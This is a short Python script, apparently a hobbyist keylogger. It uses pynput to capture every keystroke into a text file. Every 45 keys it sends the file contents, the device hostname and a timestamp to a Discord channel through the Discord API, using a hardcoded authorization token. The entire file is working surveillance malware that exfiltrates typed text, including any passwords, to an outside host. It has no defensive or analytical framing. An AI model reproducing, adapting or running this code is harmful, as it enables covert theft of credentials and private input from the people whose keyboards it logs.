import pynput
from pynput.keyboard import Key, Listener

countToSendToDiscord = 0
countForLoggerTextFile = 0
keys = []

def sendToDiscord():
    import datetime
    import requests
    import socket

    loggedKeysTextFile = open("loggedKeys.txt", "r")
    contentsOfTextFile = loggedKeysTextFile.read()
    device = socket.gethostname()
    date = datetime.datetime.now()

    payload = {
        "content" : contentsOfTextFile + "\n From: " + device + "\n Time: " + str(date)
    }

    header = {
        "Authorization" : "MTMxNjYwMDgxNzI5MzQ1OTU0NA.GSZsDE.GGlNDNwEF-Yx7flUATwUuaztt3v6ox-j-exsYE"
    }

    url = "https://discord.com/api/v9/channels/1394780057557532675/messages"

    requests.post(url, payload, headers=header)

    loggedKeysTextFile.close()


def write_file(keysList):
    with open("loggedKeys.txt", "a") as f:
        for key in keysList:

            k = str(key).replace("'", "")
            if k.find("space") > 0 or k.find("enter") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)


def on_pressed(Receivedkey):
    global countForLoggerTextFile, keys, countToSendToDiscord
    keys.append(Receivedkey)
    countForLoggerTextFile += 1
    countToSendToDiscord += 1

    if countForLoggerTextFile >= 30:
        print("Keys saved to file.")
        write_file(keys)
        countForLoggerTextFile = 0
        keys = []
    if countToSendToDiscord >= 45:
        sendToDiscord()
        print("Sent to Discord")
        countToSendToDiscord = 0
    
def on_released(ReceivedKey):
    if ReceivedKey == Key.esc:
        return False

with Listener(on_press=on_pressed, on_release=on_released) as listener:
    listener.join()